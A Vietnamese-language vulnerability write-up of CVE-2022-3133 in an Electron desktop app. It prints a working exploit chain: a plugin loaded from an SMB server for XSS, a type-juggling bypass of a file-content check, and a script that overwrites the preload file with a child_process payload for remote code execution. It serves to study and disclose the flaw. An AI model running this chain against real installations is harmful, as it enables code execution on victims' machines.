# CVE-2022-3133

Lỗ hổng này được report và public trên [huntr.dev](https://huntr.dev/) bởi researcher [mizu](https://huntr.dev/users/kevin-mizu/), cụ thể là lạm dụng lổ hổng XSS để thực hiện chức năng `writeFile` ở `IPC Main` để override tệp `preload script` để có thể thực thi mã từ xa (RCE).

## Abuse of ipcMain to override preload script

Ở file `electron.js`, ipcMain được định nghĩa lắng nghe sự kiện `rendererReq` và bao gồm nhiều action

```javascript=
...
ipcMain.on("rendererReq", async (event, args) => 
{
	try
	{
		let ret = null;

		switch(args.action)
		{
		...
		case 'writeFile':
			ret = await writeFile(args.path, args.data, args.enc);
			break;
                ...
```
trong đó đáng chú ý là `writeFile` action nhận vào tham số là `path, data, enc`. Đồng thời, ở `electron-preloads.js` expose API `electron` cho phép gọi `rendererReq` channel từ `renderer process` như sau

```javascript=
...
contextBridge.exposeInMainWorld(
    'electron', {
        request: (msg, callback, error) => 
		{
			msg.reqId = reqId++;
			reqInfo[msg.reqId] = {callback: callback, error: error};

			//TODO Maybe a special function for this better than this hack?
			//File watch special case where the callback is called multiple times
			if (msg.action == 'watchFile')
			{
				fileChangedListeners[msg.path] = msg.listener;
				delete msg.listener;
			}

			ipcRenderer.send('rendererReq', msg);
        },
    ...
```
=> Ý tưởng ở đây sẽ là lạm dụng chức năng `writeFile` này để ghi đè thay đổi nội dung của `electron-preload.js` để trực tiếp thực thi mã `NodeJS`.

## Type juggling bypass checkFileContent

Hàm `writeFile` được định nghĩa như sau:

```javascript=
...
async function writeFile(path, data, enc)
{
	if (!checkFileContent(data, enc))
	{
		throw new Error('Invalid file data');
	}
	else
	{
		return await fsProm.writeFile(path, data, enc);
	}
};
...
```
trong đó, hàm `checkFileContent` kiểm tra `content type` từ dữ liệu đưa vào, mục tiêu của chúng ta là phải chèn nội dung `javascript` hợp lệ vào `electron-preload.js`. 

```javascript=
...
function checkFileContent(body, enc)
{
	if (body != null)
	{
		let head, headBinay;
		
		if (typeof body === 'string')
		{
			if (enc == 'base64')
			{
				headBinay = Buffer.from(body.substring(0, 22), 'base64');
				head = headBinay.toString();
			}
			else
			{
				head = body.substring(0, 16);
				headBinay = Buffer.from(head);
			}
		}
        ...
        let c1 = head[0],
		c2 = head[1],
        c3 = head[2],
		c4 = head[3],
        ...
        if (c1 == '<')
		{
            // text/html
			if (c2 == '!'
                ...
            // application/xml
			if (c2 == '?' && c3 == 'x' && c4 == 'm' && c5 == 'l'
					&& c6 == ' ')
			{
                ...
```
Ở đây ta có thể thấy rằng dữ liệu mong muốn từ đầu vào là các file định dạng như `text/html, application/xml, application/pdf, image/*`. Nghĩa là những bytes đầu tiên của các định dạng này thường bắt đầu bằng những ký tự đặc biệt, vì lý do này nên sẽ gây ra lỗi syntax khi viết vào một file javascript.

Một điều nữa là chỉ lấy 16 bytes header từ input để validate nếu không phải là dạng base64, còn nếu là base64 thì lấy 22 ký tự đầu để đem đi decode và tiếp theo là đem đi check. 

Mục tiêu của chúng ta đơn giản chỉ là làm cho hàm này trả về `true` là được, sau đó dữ liệu sẽ được đưa vào `fsProm.writeFile` để ghi xuống tệp. Vậy bug ở đây là gì???

```javascript=
...
function checkFileContent(body, enc)
{
	if (body != null)
	{
		let head, headBinay;
		
		if (typeof body === 'string')
		{
			if (enc == 'base64')
                ...
...
```
Lỗ hổng type juggling xuất hiện ở `enc == 'base64'`, bởi vì

```bash=
> "base64" == "base64"
true
> ["base64"] == "base64"
true
```
Vậy nếu ta truyền vào tham số `enc = ["base64"]` thì sẽ có ý nghĩa gì??? Mọi thứ đều có lý do của nó =)))

![](https://hackmd.io/_uploads/BJHtSASdh.png)

Vì hàm `fs.writeFile` nhận vào tham số option là `string hoặc object`, nếu option `encoding = "base64"` thì input sẽ decode base64 rồi mới được ghi xuống file, còn nếu `encoding = ["base64"]` thì dữ liệu sẽ không cần decode vì `default = utf-8` mà ghi thẳng xuống file.

```javascript=
const fsProm = require('fs/promises');
fsProm.writeFile("/tmp/output", "PGh0bWwxMzMzMzMzMzMzMzM=", "base64")

// Output: <html133333333333
```

```javascript=
const fsProm = require('fs/promises');
fsProm.writeFile("/tmp/output", "PGh0bWwxMzMzMzMzMzMzMzM=", ["base64"])

// Output: PGh0bWwxMzMzMzMzMzMzMzM=
```

Như vậy là đã rõ, nếu ta truyền vào data là chuỗi bắt đầu bằng `<html` dạng `base64` ở 22 ký tự đầu với `enc = ["base64"]` thì khi validate sẽ bị base64 decode nhưng đến hàm `fsProm.write` sẽ khi trực tiếp chuỗi base64 xuống file và có thể control được code ở phía sau.

```
PGh0bWxhYWFhYWFhYWFhYWE=1;require('child_process').exec('calc');//
```
## Find the webroot

May mắn là `rendererReq` channel ở `ipcMain` có `getCurDir` action, action này sẽ thực thi hàm `getCurDir` và trả về đường dẫn hiện tại => Đường dẫn này cũng là nơi chứa `electron-preload.js`

```javascript=
...
ipcMain.on("rendererReq", async (event, args) => 
{
	try
	{
		let ret = null;

		switch(args.action)
        {
                ...
                case 'getCurDir':
			ret = await getCurDir();
			break;
        }
...
```

## Look for XSS vulnerabilities

![](https://hackmd.io/_uploads/rJvTQt8dh.png)
Theo như document thì các plugin có thể được load thông qua việc cấu hình một danh sách các tên plugin trên UI.

Chẳng hạn như ta cấu hình như thế này:

![](https://hackmd.io/_uploads/SJGFSt8O2.png)

thì plugin `voice` sẽ được load

![](https://hackmd.io/_uploads/HyXoBKLOn.png)

Vì lý do bị hạn chế bởi CSP nên ta không thể load bất kỳ extension nào khác tùy ý

```
default-src 'self'; connect-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data:; media-src *; font-src *; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
```
nên các script chỉ có thể được load từ `self` nhưng ta có thể hoàn toàn bypass được CSP này thông qua load một script từ SMB server, vấn đề này đã được nói rõ từ bản report [https://huntr.dev/bounties/911a4ada-7fd6-467a-a464-b88604b16ffc/](https://huntr.dev/bounties/911a4ada-7fd6-467a-a464-b88604b16ffc/)

```jsonld=
{
  "plugins": [
    "\\\\\\10.69.157.158\\js-server\\exploit.js"
  ]
}
```

## Exploit

Ý tưởng khai thác là lạm dụng lỗ hổng XSS thông qua tamper configure load malicous script từ SMB server để gọi các APIs từ renderer process, thực hiện lần lượt các action `getCurDir, writeFile` để ghi đè `electron-preload.script`. Sau đó, thực hiện `electron.sendMessage('newfile')` để tạo ra một renderer process mới, đồng thời để `electron-preload.js` mới được load và RCE.

```javascript=
electron.request({
    action: "getCurDir"
}, (d) => {
    electron.request({
        action: "writeFile",
        path: `${d}/electron-preload.js`,
        data: "PGh0bWxYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY=1;\nrequire('child_process').exec('calc');//",
        enc: ["base64"]
    }, (res) => {
        electron.sendMessage('newfile', {width: 100, height: 100 });
    })
})
```

<iframe width="560" height="315" src="https://www.youtube.com/embed/A__d6f-iuxE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

## References
- https://huntr.dev/bounties/2d93052f-efc6-4647-9a6d-8b08dc251223/
- https://huntr.dev/bounties/911a4ada-7fd6-467a-a464-b88604b16ffc/
- https://deepsec.net/docs/Slides/2021/Hacking_Modern_Desktop_apps_with_XSS_and_RCE_Abraham_Aranguren.pdf
- https://www.electronjs.org/docs/latest/tutorial/ipc
